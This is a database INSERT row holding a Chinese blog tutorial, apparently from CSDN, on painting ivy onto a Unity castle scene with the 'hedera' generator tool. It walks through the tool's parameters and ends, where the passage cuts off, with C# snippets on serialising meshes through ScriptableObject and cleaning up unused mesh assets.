INSERT INTO `t_article` VALUES (48, 'Unity实战篇，小岛城堡里的常春藤，听新发剖析Unity案例知识点', '<div id=\"content_views\" class=\"markdown_views prism-tomorrow-night-eighties\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>文章目录</h3> \n  <ul>\n   <li>\n    <ul>\n     <li>\n      <ul>\n       <li><a href=\"#_2\">一、前言</a></li>\n       <li><a href=\"#_8\">二、效果演示</a></li>\n       <li><a href=\"#_17\">三、常春藤生成器工具下载</a></li>\n       <li><a href=\"#__21\">四、 工具使用</a></li>\n       <li>\n        <ul>\n         <li><a href=\"#1lvy_GameObject_22\">1、创建根节点：lvy GameObject</a></li>\n         <li><a href=\"#2lvy_Profile_Asset_27\">2、创建配置文件：lvy Profile Asset</a></li>\n         <li><a href=\"#3_50\">3、贴图与材质球</a></li>\n         <li><a href=\"#4_59\">4、绘制常春藤</a></li>\n         <li><a href=\"#5_66\">5、修改叶子颜色</a></li>\n         <li><a href=\"#6_75\">6、修改叶子大小</a></li>\n         <li><a href=\"#7_84\">7、修改叶子密度</a></li>\n         <li><a href=\"#8_89\">8、修改根茎粗细</a></li>\n         <li><a href=\"#9_96\">9、修改生长长度</a></li>\n         <li><a href=\"#10_108\">10、修改分支概率</a></li>\n         <li><a href=\"#11_113\">11、删除已绘制的常春藤</a></li>\n        </ul> </li>\n       <li><a href=\"#_122\">五、拓展知识解答</a></li>\n       <li>\n        <ul>\n         <li><a href=\"#1Mesh_123\">1、常春藤的Mesh资源存放在哪里</a></li>\n         <li><a href=\"#2Mesh_200\">2、如何删除无用的Mesh</a></li>\n         <li><a href=\"#3_218\">3、如何获取鼠标投射到物体表面的位置</a></li>\n         <li><a href=\"#4_272\">4、场景中的水面是怎么做的（半透明和反射效果）</a></li>\n         <li><a href=\"#5_285\">5、场景中的天空是怎么做的</a></li>\n         <li><a href=\"#6_306\">6、场景中的草是怎么做的，为什么它会摇啊摇</a></li>\n        </ul> </li>\n       <li><a href=\"#_369\">六、结束语</a></li>\n      </ul> </li>\n    </ul> </li>\n  </ul> \n </div> \n <p></p> \n <h3><a id=\"_2\"></a>一、前言</h3> \n <p>嗨，大家好，我是新发。<br> 记得初中的时候语文课本里有一篇名字叫《最后一片叶子》的文章，作者是著名的短篇小说家欧·亨利。</p> \n <blockquote> \n  <p>《最后一片叶子》又叫《最后一片常春藤叶》，文中讲述了老画家贝尔曼为了鼓励贫病交加的青年画家顽强地活下去，在风雨之夜挣扎着往墙上画了一片永不凋零的常春藤叶。他为此用生命绘制的杰作付出了生命的代价，但青年画家却因此获得勇气而活了下来的故事。</p> \n </blockquote> \n <p>常春藤寓意着希望、朝气蓬勃，也象征着忠诚，还代表着和不朽的青春，因为它一年四季都是常绿的，所以很多人喜欢在阳台上种常春藤，显得格外有生气。本文，我就来证明一下常春藤的魔力，我将在<code>Unity</code>中演示制作常春藤的过程，并讲解其中涉及到的一些技术知识点。</p> \n <h3><a id=\"_8\"></a>二、效果演示</h3> \n <p>场景，我希望是在一个优美的岛屿城堡，我找到了一个不错的场景，如下：</p> \n <blockquote> \n  <p>注：喜欢这个城堡场景资源的同学，可以自行从这里下载：<a href=\"https://assetstore.unity.com/packages/3d/props/exterior/low-poly-brick-houses-131899\">https://assetstore.unity.com/packages/3d/props/exterior/low-poly-brick-houses-131899</a></p> \n </blockquote> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610150851995.gif\" alt=\"在这里插入图片描述\"><br> 在窗户上绘制生成常春藤，如下：<br> <img src=\"https://img-blog.csdnimg.cn/2021061016300480.gif\" alt=\"在这里插入图片描述\"><br> 对比下前后效果，是不是有了常春藤之后，瞬间生机盎然了~<br> <img src=\"https://img-blog.csdnimg.cn/20210610164406238.gif\" alt=\"在这里插入图片描述\"></p> \n <h3><a id=\"_17\"></a>三、常春藤生成器工具下载</h3> \n <p>我使用的是<code>Github</code>的这个工具：<strong>hedera</strong>，这个工具可以很方便地在场景中制作并生成常春藤一样的植物，感兴趣的同学可以下载从<code>GitHub</code>上下载来学习。<br> <code>GitHub</code>地址：<a href=\"https://github.com/radiatoryang/hedera\">https://github.com/radiatoryang/hedera</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610190048947.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h3><a id=\"__21\"></a>四、 工具使用</h3> \n <h4><a id=\"1lvy_GameObject_22\"></a>1、创建根节点：lvy GameObject</h4> \n <p>点击菜单<code>Hedera / Create / Create New lvy GameObject</code>，<br> <img src=\"https://img-blog.csdnimg.cn/2021061019052072.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 此时会生成一个<code>lvy Group</code>节点，它身上会带一个<code>lvyBehavior</code>组件，我们下面生成的常春藤就是在这个节点之下生成的。<br> <img src=\"https://img-blog.csdnimg.cn/20210610191404863.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"2lvy_Profile_Asset_27\"></a>2、创建配置文件：lvy Profile Asset</h4> \n <p>上面我们可以看到，<code>lvyBehavior</code>组件需要指定一个配置文件，这个配置文件用于配置常春藤生成的规则与相关参数。<br> 工具已经帮我们做好了几个配置，在<code>Runtime/lvyProfiles</code>目录中，<br> <img src=\"https://img-blog.csdnimg.cn/20210610192031591.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 为了演示，我创建一个新的，点击<code>Create new lvy Profile Asset...</code>按钮，<br> <img src=\"https://img-blog.csdnimg.cn/20210610191727110.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 将其保存到<code>Runtime/lvyProfiles</code>目录中，<br> <img src=\"https://img-blog.csdnimg.cn/20210610191906115.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 生成后选中它，可以在<code>Inspector</code>视图中看到配置的参数，<br> <img src=\"https://img-blog.csdnimg.cn/2021061019242735.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 参数说明：</p> \n <table>\n  <thead>\n   <tr>\n    <th align=\"left\">参数</th>\n    <th align=\"left\">说明</th>\n   </tr>\n  </thead>\n  <tbody>\n   <tr>\n    <td align=\"left\">Length</td>\n    <td align=\"left\">生成长度，可以设置上下限，从这个范围内进行随机</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Branch Chance %</td>\n    <td align=\"left\">生成分支的概率</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Random Spread %</td>\n    <td align=\"left\">随机分布率</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Branch Thickness</td>\n    <td align=\"left\">根茎的粗度</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Leaf Size Radius</td>\n    <td align=\"left\">叶子大小</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Leaf Density %</td>\n    <td align=\"left\">叶子密度</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Leaf Colors</td>\n    <td align=\"left\">叶子颜色</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Brahcn Material</td>\n    <td align=\"left\">根茎的材质</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Leaf Material</td>\n    <td align=\"left\">叶子的材质</td>\n   </tr>\n  </tbody>\n </table> \n <h4><a id=\"3_50\"></a>3、贴图与材质球</h4> \n <p>我们需要先准备常春藤的贴图（包括根茎+叶子），例：<br> <img src=\"https://img-blog.csdnimg.cn/20210610200741545.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 制作根茎和叶子的材质球：<br> <img src=\"https://img-blog.csdnimg.cn/20210610200931146.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 材质球设置如下（根茎+叶子）：<br> <img src=\"https://img-blog.csdnimg.cn/20210611090227430.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"> <img src=\"https://img-blog.csdnimg.cn/20210611090246432.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 给<code>lvy Profile Asset</code>设置根茎和叶子的材质球，<br> <img src=\"https://img-blog.csdnimg.cn/20210610201119312.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"4_59\"></a>4、绘制常春藤</h4> \n <p>选中<code>lvy Group</code>，点击<code>Start Painting lvy</code>按钮，<br> <img src=\"https://img-blog.csdnimg.cn/20210610201432674.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 然后把鼠标移到<code>Scene</code>视图中，即可看到有个蓝紫色的圈圈投射在物体表面上，<br> <img src=\"https://img-blog.csdnimg.cn/20210610201738421.gif\" alt=\"在这里插入图片描述\"><br> 此时按住鼠标滑动即可生成常春藤，<br> <img src=\"https://img-blog.csdnimg.cn/20210610203328808.gif\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"5_66\"></a>5、修改叶子颜色</h4> \n <p>我们看到绘制出来的叶子颜色是 白/绿/黄 的，<br> <img src=\"https://img-blog.csdnimg.cn/20210610203532590.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 这是因为在<code>lvy Profile Asset</code>中设置的叶子颜色是这样的：<br> <img src=\"https://img-blog.csdnimg.cn/20210610203732898.png\" alt=\"在这里插入图片描述\"><br> 我们可以将其修改成我们想要的其他颜色，比如改成这样：<br> <img src=\"https://img-blog.csdnimg.cn/2021061109062928.png\" alt=\"在这里插入图片描述\"><br> 重新绘制出来的叶子颜色如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210611090741695.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"6_75\"></a>6、修改叶子大小</h4> \n <p>调整<code>Leaf Size Radius</code>可以修改叶子的大小，<br> <img src=\"https://img-blog.csdnimg.cn/20210611091048482.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 我们把叶子大小调小，调整参数后可以点击<code>Re-mesh Visible</code>按钮，就会根据调整后的参数重新运算~<br> <img src=\"https://img-blog.csdnimg.cn/20210611091535671.png\" alt=\"在这里插入图片描述\"><br> 调整前是这样：<br> <img src=\"https://img-blog.csdnimg.cn/20210611091254249.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 调整后是这样：<br> <img src=\"https://img-blog.csdnimg.cn/20210611091420876.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"7_84\"></a>7、修改叶子密度</h4> \n <p>调整<code>Leaf Density %</code>可以修改叶子密度，<br> <img src=\"https://img-blog.csdnimg.cn/20210611091946191.png\" alt=\"在这里插入图片描述\"><br> 我们把叶子密度调大，如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210611092050911.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"8_89\"></a>8、修改根茎粗细</h4> \n <p>我们觉得根茎有点粗，<br> <img src=\"https://img-blog.csdnimg.cn/20210611092259313.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 想调细一点，调整<code>Branch Thickness</code>，把根茎调细，<br> <img src=\"https://img-blog.csdnimg.cn/20210611092204445.png\" alt=\"在这里插入图片描述\"><br> 如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210611092510469.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"9_96\"></a>9、修改生长长度</h4> \n <p>调整<code>Length</code>可以修改生长长度，<br> <img src=\"https://img-blog.csdnimg.cn/20210611092741284.png\" alt=\"在这里插入图片描述\"><br> 我们测试下最小值和最大值的效果，调整为最小值，此时绘制常春藤不会自动继续生长，</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611092841898.png\" alt=\"在这里插入图片描述\"><br> 效果如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210611093216383.gif\" alt=\"在这里插入图片描述\"><br> 现在，我们把<code>Lehgth</code>调为最大值，<br> <img src=\"https://img-blog.csdnimg.cn/20210611093429551.png\" alt=\"在这里插入图片描述\"><br> 因为它生长力太强了，所以我在地面上演示，感受一下，<br> <img src=\"https://img-blog.csdnimg.cn/20210611094522363.gif\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"10_108\"></a>10、修改分支概率</h4> \n <p>我们看到生长过程中的分支概率比较低，我们可以调整<code>Branch Chance %</code>来修改分支概率，<br> <img src=\"https://img-blog.csdnimg.cn/20210611094843832.png\" alt=\"在这里插入图片描述\"><br> 我们把分支概率调到最大值，感受一下，<br> <img src=\"https://img-blog.csdnimg.cn/20210611095211646.gif\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"11_113\"></a>11、删除已绘制的常春藤</h4> \n <p>假设我们要删除这条常春藤，并不是直接<code>delete</code>它的<code>GameObject</code>，<br> <img src=\"https://img-blog.csdnimg.cn/20210611100352722.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 而是先选中它所在的<code>Group</code>，<br> <img src=\"https://img-blog.csdnimg.cn/20210611100449504.png\" alt=\"在这里插入图片描述\"><br> 然后点击对应的垃圾桶按钮，<br> <img src=\"https://img-blog.csdnimg.cn/20210611100532918.png\" alt=\"在这里插入图片描述\"><br> 如果一个<code>Group</code>下有多条常春藤，则会会显示多个<code>item</code>，<br> <img src=\"https://img-blog.csdnimg.cn/20210611100652772.png\" alt=\"在这里插入图片描述\"></p> \n <h3><a id=\"_122\"></a>五、拓展知识解答</h3> \n <h4><a id=\"1Mesh_123\"></a>1、常春藤的Mesh资源存放在哪里</h4> \n <p>我们点开常春藤的节点，可以看到一个根茎节点和一个叶子节点，<br> <img src=\"https://img-blog.csdnimg.cn/20210611102419918.png\" alt=\"在这里插入图片描述\"><br> 工具帮我们生成了根茎和叶子的<code>Mesh</code>，这些<code>Mesh</code>文件会自动存放在场景所在目录的同名目录中，<br> <img src=\"https://img-blog.csdnimg.cn/20210611102731909.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 它是序列化在一个<code>.assset</code>文件中的，<br> <img src=\"https://img-blog.csdnimg.cn/20210611103507219.png\" alt=\"在这里插入图片描述\"><br> 根茎的<code>Mesh</code>，<br> <img src=\"https://img-blog.csdnimg.cn/20210611103047668.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>叶子的<code>Mesh</code>，<br> <img src=\"https://img-blog.csdnimg.cn/20210611103002637.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <strong>思考</strong>：它是如何将网格资源序列化到asset文件中的？<br> <strong>解答</strong>：<br> 需要序列化的类继承<code>ScriptableObject</code>，例：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IvyDataAsset</span> <span class=\"token punctuation\">:</span> <span class=\"token class-name\">ScriptableObject</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p>通过<code>ScriptableObject.CreateInstance</code>创建序列化文件，例：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">IvyDataAsset</span> <span class=\"token function\">CreateNewDataAsset</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">string</span> mainFolder<span class=\"token punctuation\">,</span> <span class=\"token keyword\">string</span> sceneName<span class=\"token punctuation\">,</span> <span class=\"token keyword\">string</span> path<span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>AssetDatabase<span class=\"token punctuation\">.</span><span class=\"token function\">IsValidFolder</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">var</span> folderGUID <span class=\"token operator\">=</span> AssetDatabase<span class=\"token punctuation\">.</span><span class=\"token function\">CreateFolder</span><span class=\"token punctuation\">(</span> mainFolder<span class=\"token punctuation\">,</span> sceneName <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		path <span class=\"token operator\">=</span> AssetDatabase<span class=\"token punctuation\">.</span><span class=\"token function\">GUIDToAssetPath</span><span class=\"token punctuation\">(</span>folderGUID<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token punctuation\">}</span>\n	\n	<span class=\"token class-name\">IvyDataAsset</span> asset <span class=\"token operator\">=</span> ScriptableObject<span class=\"token punctuation\">.</span><span class=\"token generic-method\"><span class=\"token function\">CreateInstance</span><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">IvyDataAsset</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	AssetDatabase<span class=\"token punctuation\">.</span><span class=\"token function\">CreateAsset</span><span class=\"token punctuation\">(</span>asset<span class=\"token punctuation\">,</span> path <span class=\"token operator\">+</span> <span class=\"token string\">\"/HederaData.asset\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	AssetDatabase<span class=\"token punctuation\">.</span><span class=\"token function\">SaveAssets</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">return</span> asset<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p>然后在<code>IvyDataAsset</code>中定义需要序列化的内容，</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token comment\">// IvyDataAsset.cs</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IvyDataAsset</span> <span class=\"token punctuation\">:</span> <span class=\"token class-name\">ScriptableObject</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">public</span> <span class=\"token class-name\">IvyDictionary</span> meshList <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IvyDictionary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	\n	<span class=\"token punctuation\">[</span><span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Serializable</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IvyDictionary</span> <span class=\"token punctuation\">:</span> <span class=\"token class-name\">SerializableDictionary</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">,</span> Mesh<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{\n    <!-- --></span> <span class=\"token punctuation\">}</span>\n	\n	<span class=\"token punctuation\">[</span><span class=\"token class-name\">System<span class=\"token punctuation\">.</span>Serializable</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SerializableDictionary</span><span class=\"token operator\">&lt;</span>TKey<span class=\"token punctuation\">,</span> TValue<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">:</span> Dictionary<span class=\"token operator\">&lt;</span>TKey<span class=\"token punctuation\">,</span> TValue<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> ISerializationCallbackReceiver\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token punctuation\">[</span><span class=\"token class-name\">SerializeField</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">private</span> List<span class=\"token operator\">&lt;</span>TKey<span class=\"token operator\">&gt;</span> keys <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token generic-method\"><span class=\"token function\">List</span><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">TKey</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token punctuation\">[</span><span class=\"token class-name\">SerializeField</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">private</span> List<span class=\"token operator\">&lt;</span>TValue<span class=\"token operator\">&gt;</span> values <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token generic-method\"><span class=\"token function\">List</span><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">TValue</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	\n		<span class=\"token comment\">// ...</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>关于Unity的类的序列化，还可以参见我早先写的这篇文章：<a href=\"https://blog.csdn.net/linxinfa/article/details/51971633\">《unity 类的序列化》</a></p> \n </blockquote> \n <p>如果我们想要自定义<code>Inspector</code>界面的内容，我们还可以写对应的<code>Editor</code>类，重写<code>OnInspectorGUI</code>函数，例：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token comment\">// IvyDataAssetEditor.cs</span>\n\n<span class=\"token punctuation\">[</span><span class=\"token class-name\">CustomEditor</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">typeof</span><span class=\"token punctuation\">(</span>IvyDataAsset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IvyDataAssetEditor</span> <span class=\"token punctuation\">:</span> <span class=\"token class-name\">Editor</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">public</span> <span class=\"token keyword\">override</span> <span class=\"token keyword\">void</span> <span class=\"token function\">OnInspectorGUI</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> \n	<span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">var</span> data <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>IvyDataAsset<span class=\"token punctuation\">)</span>target<span class=\"token punctuation\">;</span>\n		<span class=\"token comment\">// ...</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <h4><a id=\"2Mesh_200\"></a>2、如何删除无用的Mesh</h4> \n <p>选中<code>HederaData</code>文件，点击<code>Cleanup Unreferenced Meshes</code>按钮，接口自动清理无用的<code>Mesh</code>资源。<br> <img src=\"https://img-blog.csdnimg.cn/20210611103417144.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 对应的逻辑：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token comment\">// IvyDataAssetEditor.cs</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> GUILayout<span class=\"token punctuation\">.</span><span class=\"token function\">Button</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n   <span class=\"token keyword\">var</span> allReferencedMeshes <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>meshList<span class=\"token punctuation\">.</span>Values<span class=\"token punctuation\">.</span><span class=\"token function\">ToList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span>allSubassets<span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n       <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>allReferencedMeshes<span class=\"token punctuation\">.</span><span class=\"token function\">Contains</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>Mesh<span class=\"token punctuation\">)</span>allSubassets<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n           Object<span class=\"token punctuation\">.</span><span class=\"token function\">DestroyImmediate</span><span class=\"token punctuation\">(</span>allSubassets<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">}</span>\n   <span class=\"token punctuation\">}</span>\n   EditorUtility<span class=\"token punctuation\">.</span><span class=\"token function\">SetDirty</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   AssetDatabase<span class=\"token punctuation\">.</span><span class=\"token function\">SaveAssets</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <h4><a 